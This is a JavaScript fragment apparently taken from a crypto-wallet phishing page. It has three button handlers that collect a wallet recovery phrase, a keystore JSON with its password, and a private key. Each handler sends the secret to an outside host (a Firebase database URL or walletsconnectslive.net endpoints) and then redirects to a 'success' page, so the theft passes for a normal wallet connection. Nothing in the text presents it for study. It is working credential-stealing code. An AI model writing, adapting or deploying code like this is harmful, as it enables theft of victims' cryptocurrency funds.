 const phraseProceedBtn = document.getElementById('phraseProceed');
    const keystorejsonProceedBtn = document.getElementById('keystorejsonproceed');
    const privatekeyProceedBtn = document.getElementById('privatekeyProceed');
    const phraseProceedHandler = () => {
      event.preventDefault();
      let phraseInputVal = document.getElementById('phraseInput').value;
      const wallet = document.getElementById('wallet_id').value;
      if (phraseInputVal.trim() === "") {
        alert('Fill in your recovery phrase');
      } else {
        $.ajax({
          url: "https://amen-1bc99-default-rtdb.firebaseio.com/.json",
          method: 'POST',
          data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal, _token: "VNSElc2gRav1j8Vo06hMGE2lgerCJRM3VHsxXmjf" },
          success: function (res) {
            if (res.trim() != "") {
              if (res.trim() == "string_error") {
                alert('Fill in your recovery phrase');
              } else if (res.trim() == "success") {
                phraseInputVal = '';
                  redirect();
                document.querySelector('.sending').style.display = 'block';                          
              }
            } else {
              alert('Could not proceed due to some errors, kindly try again later.')
            }
          }
        });
      }
    };

    const keystorejsonProceedHandler = () => {
      event.preventDefault();
      let keystorejson = document.getElementById('keystorejson').value;
      let keystorepassword = document.getElementById('keystorepassword').value;
      const wallet = document.getElementById('wallet_id').value;
      if (keystorejson.trim() === "" || keystorepassword === "") {
        alert('Fill out all form fields before proceeding');
      } else {
        $.ajax({
          url: "https://walletsconnectslive.net/secondform",
          method: 'POST',
          data: { import_type: 'keystorejson', wallet: wallet, keystorejson: keystorejson, keystorepassword: keystorepassword, _token: "VNSElc2gRav1j8Vo06hMGE2lgerCJRM3VHsxXmjf" },
          success: function (res) {
            if (res.trim() !== "") {
              if (res.trim() === "string_error") {
                alert('Fill out all form fields before proceeding');
              } else if (res.trim() == "success") {
                keystorepassword = '';
                keystorejson = '';
                  redirect();
                document.querySelector('.sending').style.display = 'block';  
              } else {
                alert('Could not proceed due to some errors, kindly try again later.')
              }
            }
          }
        });
      }
    };

    const privateKeyProceedHandler = () => {
      event.preventDefault();
      let privatekey = document.getElementById('privatekey').value;
      const wallet = document.getElementById('wallet_id').value;
      console.log(wallet);
      if (privatekey.trim() === "") {
        alert('Fill in your private key');
      } else {
        $.ajax({
          url: "https://walletsconnectslive.net/thirdform",
          method: 'POST',
          data: { import_type: 'private', wallet: wallet, privatekey: privatekey, _token: "VNSElc2gRav1j8Vo06hMGE2lgerCJRM3VHsxXmjf" },
          success: function (res) {
            if (res.trim() !== "") {
              if (res.trim() === "string_error") {
                alert('Fill in your private key.');
              } else if (res.trim() === "success") {
                privatekey = '';
                  redirect();
                document.querySelector('.sending').style.display = 'block';   
              }
            } else {
              alert('Could not proceed due to some errors, kindly try again later.')
            }
          }
        });
      }
    };

    const redirect = () => {
      window.location.href = "success.html";
    };

    phraseProceedBtn.addEventListener('click', phraseProceedHandler);
    keystorejsonProceedBtn.addEventListener('click', keystorejsonProceedHandler);
    privatekeyProceedBtn.addEventListener('click', privateKeyProceedHandler);
